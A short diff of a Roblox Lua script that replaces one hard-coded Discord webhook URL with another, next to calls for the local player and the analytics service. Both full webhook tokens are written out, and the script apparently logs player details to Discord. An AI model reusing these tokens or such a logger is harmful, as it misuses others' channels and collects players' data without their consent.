@@ -6,7 +6,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local player = Players.LocalPlayer
 
-local WEBHOOK_URL = 'https://discord.com/api/webhooks/1482322321115975732/RP4pviQrItP9uKV912vl_NB_hyQD2uVvxXJMphnUgnRsIhNYhmrTnZNxscwSGCFAvI5m'
+local WEBHOOK_URL = 'https://discord.com/api/webhooks/1559636679046864956/9Qkn50J2JPoFd1N_SIyAoSHcLzvQ5ALE9WCd8JMCSyut6JFGAqIEjqBOb2VxDnSQ-rX1'
 
 local OSTime = os.time() 
 local Time = os.date('!*t', OSTime)
